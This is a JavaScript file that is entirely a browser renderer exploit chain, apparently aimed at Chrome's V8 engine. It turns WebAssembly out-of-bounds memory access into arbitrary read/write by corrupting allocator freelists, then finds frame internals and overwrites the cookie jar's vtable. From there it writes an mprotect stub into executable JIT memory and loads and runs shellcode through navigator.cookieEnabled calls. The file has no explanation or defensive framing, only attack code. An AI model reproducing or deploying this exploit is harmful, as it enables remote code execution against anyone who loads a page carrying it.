wasm_xpl_done = false;

function parse_wasm_module() {
  var len = wasm_module.length / 2;
  var buf = new Uint8Array(len);
  for (var i = 0; i < len; i++) {
    hex = '0x' + wasm_module.substring(i * 2, i * 2 + 2);
    buf[i] = parseInt(hex);
  }
  return buf;
}

function arr_to_u64(arr) {
  return new u64(arr[0], arr[1]);
}

function u64_to_arr(u64, arr) {
  arr[0] = u64.lo;
  arr[1] = u64.hi;
}

function read_oob(off) {
  var lo = wasm.exports.read_u32(off);
  var hi = wasm.exports.read_u32(off + 4);
  return new u64(lo, hi);
}

function write_oob(off, val) {
  wasm.exports.write_u32(off, val.lo);
  wasm.exports.write_u32(off + 4, val.hi);
}

function read(addr) {
  u64_to_arr(addr, freelist);
  var b = new Uint32Array();
  b.buffer;
  junk.push(b);
  return arr_to_u64(freelist).bswap();
}

function write(addr, val) {
  u64_to_arr(addr, freelist);
  var rw = new Uint32Array(2);
  rw.buffer;
  u64_to_arr(val, rw);
  junk.push(rw);
}

function setup_wasm_rw() {
  raw_wasm = parse_wasm_module();
  var mod = WebAssembly.Module(raw_wasm);
  var ffi = {
    mod: {
      get imp() {
        log('getter');
        wasm2 = WebAssembly.Instance(mod, {mod: {imp: function(){}}});
        spacer = new ArrayBuffer(0x10000);
        return function() {};
      }
    }
  };
  wasm = WebAssembly.Instance(mod, ffi);
  wasm2.exports.memory.grow(1);
  junk = [];
  while (true) {
    junk.push(new ArrayBuffer(8));
    var p1 = read_oob(8).bswap();
    var p2 = read_oob(16).bswap();
    if (p2.sub(p1).val() == 8)
      break;
  }
  var b8ptr = read_oob(8).bswap();
  scratch = b8ptr.sub_u32(0x20010);
  scratch_buf = new DataView(wasm2.exports.memory.buffer);
  log('scratch: ' + scratch.str());
  var superpage_mask = mku64((1 << 21) - 1);
  superpage = b8ptr.and(superpage_mask.not());
  var partition_page_idx = b8ptr.and(superpage_mask).shr(14).val()
  var freelist_addr = superpage.add_u32(0x1000 + partition_page_idx * 0x20);
  write_oob(8, freelist_addr.bswap())
  junk.push(new ArrayBuffer(8));
  freelist = new Uint32Array(2);
  freelist.buffer;
  // read() and write() are ready
}

function field(obj, idx) {
  return read(obj.add_u32(idx * 8 - 1));
}

function random_str() {
  return Math.random().toString(36);
}

function get_rwx(size) {
  var memory_chunk = global.and(mku64((1 << 19) - 1).not());
  var heap = read(memory_chunk.add_u32(0x38));
  var code_space = read(heap.add_u32(0xdd8));
  var alloc_info = code_space.add_u32(0x250);
  do {
    'aoeu'.match(new RegExp(random_str()));
    var rwx = read(alloc_info.add_u32(8));
    var limit = read(alloc_info.add_u32(0x10));
    var room = limit.sub(rwx).val();
  } while (room < size);
  var rwx = limit.sub_u32(size);
  log('rwx: ' + rwx.str());
  return rwx;
}

function find_rfi() {
  array_buffer_allocator = read(superpage.add_u32(0x1000));
  log('array_buffer_allocator: ' + array_buffer_allocator.str());
  var isolate_data = read(array_buffer_allocator.add_u32(array_buffer_allocator_to_isolate_data));
  isolate = read(isolate_data);
  log('isolate: ' + isolate.str());
  var context = read(isolate.add_u32(0x1860));
  var native_context = field(context, 2 + 3);
  global = field(native_context, 2 + 2);
  local_dom_window = field(global, 6);
  log('local_dom_window: ' + local_dom_window.str());
  var local_frame = read(local_dom_window.add_u32(0x48));
  var local_frame_client = read(local_frame.add_u32(0x40));
  var web_frame = read(local_frame_client.add_u32(8));
  var web_frame_client = read(web_frame.add_u32(0x68));
  log('web_frame_client: ' + web_frame_client.str());
  rfi = web_frame_client.sub_u32(0x30);
  log('rfi: ' + rfi.str());
  log('rfivt: ' + read(rfi).str());
}

function read_scratch(off) {
  var lo = scratch_buf.getUint32(off, true);
  var hi = scratch_buf.getUint32(off + 4, true);
  return new u64(lo, hi);
}

function write_scratch(off, val) {
  scratch_buf.setUint32(off, val.lo, true);
  scratch_buf.setUint32(off + 4, val.hi, true);
}

function get_code_exec() {
  var cookie_jar = rfi.add_u32(0xf8);
  log('cookie_jar: ' + cookie_jar.str());
  var vtable = scratch;
  var old_vt = read(cookie_jar);
  for (var i = 0; i < 5; i++)
    write_scratch(i * 8, read(old_vt.add_u32(i * 8)));
  write(cookie_jar, vtable);
  var rwx = get_rwx(0x20);
  cookies_enabled = 2 * 8;
  write_scratch(cookies_enabled, rwx);
  var mprotect_stub = [
    // mov eax, 0xa
    // mov rdi, 0x123456789abcdef0
    // mov rsi, 0x20000
    // mov rdx, 7
    // syscall
    // ret
    0x00000ab8, 0xf0bf4800, 0x789abcde, 0xbe123456,
    0x00020000, 0x000007ba, 0xc3050f00, 0x00000000
  ];
  for (var i = 0; i < mprotect_stub.length; i += 2)
    write(rwx.add_u32(i * 4), new u64(mprotect_stub[i], mprotect_stub[i + 1]));
  write(rwx.add_u32(7), scratch);
  // make scratch executable
  navigator.cookieEnabled;
}

function sc_sym(name) {
  var off = window['sym_' + name];
  if (off === undefined)
    throw 'unknown symbol ' + name;
  return off;
}
function sc_sym_off(name) {
  return sc_offset + sc_sym(name);
}
function sc_sym_ptr(name) {
  return scratch.add_u32(sc_sym_off(name));
}
function read_sc(name) {
  return read_scratch(sc_sym_off(name));
}
function write_sc(name, val) {
  write_scratch(sc_sym_off(name), val);
}

function load_shellcode() {
  var jmp_offset = 0x40;
  sc_offset = jmp_offset + 0x10;
  // jmp call_func
  write_scratch(jmp_offset, mku64(0xe9 + ((sc_sym('call_func') + 0xb) << 8)));
  if (sc.length % 2)
    sc.push(0);
  var off = sc_offset;
  for (var i = 0; i < sc.length; i += 2, off += 8)
    write_scratch(off, new u64(sc[i], sc[i + 1]));
  var jmp = scratch.add_u32(jmp_offset);
  log('sc: ' + jmp.str());
  write_scratch(cookies_enabled, jmp);
}

function write_str(addr, str) {
  str += String.fromCharCode(0);
  function word(i) {
    var w = 0;
    for (var j = 0; j < 4; i++, j++) {
      var b = i < str.length ? str.charCodeAt(i) : 0;
      w |= b << (j << 3);
    }
    return w;
  }
  var num_words = (str.length + 7) >>> 3;
  var off = 0;
  for (var i = 0; i < num_words; i++, off += 8)
    write(addr.add_u32(off), new u64(word(off), word(off + 4)));
}

function read_str(addr, size) {
  var str = '';
  function word(w) {
    for (var i = 0; i < 8 && str.length < size; i++) {
      str += String.fromCharCode(w.lo & 0xff);
      w = w.shr(8);
    }
  }
  var num_words = (size + 7) >>> 3;
  var off = 0;
  for (var i = 0; i < num_words; i++, off += 8)
    word(read(addr.add_u32(off)));
  return str;
}

function process_args(args) {
  var processed = [];
  if (args.length > 5)
    throw 'too many args';
  for (var i = 0; i < args.length; i++) {
    var arg = args[i];
    if (!(arg instanceof u64)) {
      var type = typeof arg;
      if (type === 'number') {
        arg = mku64(arg);
      } else if (type === 'string') {
        var buf = run_sc('alloc', arg.length + 1);
        write_str(buf, arg);
        arg = buf;
      } else {
        throw 'bad run_sc arg';
      }
    }
    processed.push(arg);
  }
  return processed;
}

function run_sc(func) {
  var args = process_args(Array.from(arguments).slice(1));
  var off = sc_sym_off('func_args');
  for (var i = 0; i < args.length; i++, off += 8)
    write_scratch(off, args[i]);
  write_sc('func_addr', sc_sym_ptr(func));
  navigator.cookieEnabled;
  return read_sc('func_ret');
}

function read_via_sc(addr) {
  return run_sc('read_u64', addr);
}

function write_via_sc(addr, val) {
  return run_sc('write_u64', addr, val);
}

function reset_partition_alloc() {
  read = read_via_sc;
  write = write_via_sc;
  var allocator = read(isolate.add_u32(0x5de8));
  run_sc('hook_partition_free', allocator);
  log('reset partition alloc, root: ' + array_buffer_allocator.str());
  run_sc('reset_partition_alloc', array_buffer_allocator);
}

function run_wasm_exploit() {
  setup_wasm_rw();
  find_rfi();
  get_code_exec();
  load_shellcode();
  run_sc('prepare', rfi);
  reset_partition_alloc();
  wasm_xpl_done = true;
}
